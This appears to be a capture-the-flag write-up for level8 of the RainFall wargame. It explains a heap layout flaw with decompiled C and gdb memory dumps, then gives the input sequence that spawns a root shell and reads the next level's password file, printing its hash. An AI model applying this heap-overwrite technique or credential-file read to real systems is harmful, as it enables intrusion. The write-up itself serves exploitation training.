# Walkthrough level8

This program is a while loop who read stdin and do somethings according to the
input.

Our objective is to trigger the system function:

```c
if (strncmp(input, "login", 5) == 0) {
    if (auth + 32 == NULL)
        fwrite("Password:\n", 10, 1, stdout);
    else
        system("/bin/sh");
}
```

`auth` is a pointer on the heap but we cannot write 32 characters because of
this condition:

```c
if (strncmp(input, "auth ", 5) == 0) {
    auth = malloc(4);
    char *tmp = buffer + 5;
    size_t size = strlen(tmp);
    if (size <= 30)
        strcpy(auth, tmp);
}
```

`service` permit to allocate many characters without limit:

```c
if (strncmp(input, "service", 6) == 0) {
    service = strdup(buffer + 7);
}
```

To trigger system, we need to write 32 characters after auth
(heap start = `0x804a000`):

```bash
Starting program: /home/user/level8/level8
(nil), (nil)

(gdb) n
Single stepping until exit from function main,
which has no line number information.
auth AAAA
0x804a008, (nil)

Breakpoint 2, 0x08048596 in main ()
(gdb) x/16xw 0x804a000
0x804a000:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804a010:      0x00000000      0x00020ff1      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x000000[00]<-- 0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000    | 0x00000000
                                                    [address to write]
(gdb) n
Single stepping until exit from function main,
which has no line number information.
serviceAAAAAAAAAAAAAAAA
0x804a008, 0x804a018

Breakpoint 2, 0x08048596 in main ()
(gdb) x/16xw 0x804a000
0x804a000:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804a010:      0x00000000      0x00000019      0x41414141      0x41414141
0x804a020:      0x41414141      0x41414141      0x000000[0a]<-- 0x00020fd9
0x804a030:      0x00000000      0x00000000      0x00000000    | 0x00000000
                                                    [address is changed]
```

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
